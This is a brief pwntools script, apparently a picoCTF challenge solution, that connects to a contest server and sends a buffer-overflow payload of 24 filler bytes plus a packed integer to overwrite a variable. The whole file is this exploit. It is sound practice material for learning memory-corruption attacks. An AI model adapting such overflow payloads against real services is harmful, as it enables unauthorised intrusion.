from pwn import *

r=remote('saturn.picoctf.net', 63872)

payload=b"A"*24+p32(65)

r.sendlineafter(":",payload)

print(r.recvall().decode())
